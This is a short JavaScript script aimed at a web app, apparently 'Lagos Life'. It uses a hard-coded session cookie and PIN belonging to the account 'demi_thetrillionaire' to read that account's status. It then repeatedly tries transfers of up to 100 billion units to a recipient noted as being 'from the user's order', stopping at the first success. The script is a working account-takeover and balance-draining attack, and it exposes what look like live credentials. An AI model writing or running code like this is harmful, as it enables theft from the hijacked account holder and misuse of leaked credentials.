const baseUrl = 'https://lagoslife.eliysites.com';
const demiCookie = '9385392fb01c729757ce510b848a2c4c93296c29b72e62eff6695c3c7a0127f7';
const demiPin = '5758';

const headers = {
  origin: baseUrl,
  referer: `${baseUrl}/?source=pwa`,
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
  accept: '*/*',
  'content-type': 'application/json',
  cookie: `ll_session=${demiCookie}`,
};

async function testDemi() {
  console.log('--- DEMI_THETRILLIONAIRE GL/STATUS ---');
  const resStatus = await fetch(`${baseUrl}/api/gl/status`, { method: 'GET', headers });
  console.log('Status code:', resStatus.status);
  const statusJson = await resStatus.json();
  console.log(JSON.stringify(statusJson, null, 2));

  const recipient = 'a999a47af3d14c57bd65'; // badeletio / Kelvin from the user's order
  const testAmounts = [100000000000, 50000000000, 20000000000, 10000000000, 1000000000, 10000000];

  for (const amt of testAmounts) {
    console.log(`\nTesting POST /api/send from demi_thetrillionaire with amount: ${amt} (${amt >= 1e9 ? amt / 1e9 + ' Billion' : amt / 1e6 + ' Million'})...`);
    const sendRes = await fetch(`${baseUrl}/api/send`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ to: recipient, amount: amt, pin: demiPin }),
    });
    console.log('Response status:', sendRes.status, sendRes.statusText);
    const bodyText = await sendRes.text();
    console.log('Response body:', bodyText);
    if (sendRes.ok) {
      console.log(`>>> SUCCESSFUL TRANSFER AT ${amt}!`);
      break;
    }
  }
}

testDemi();
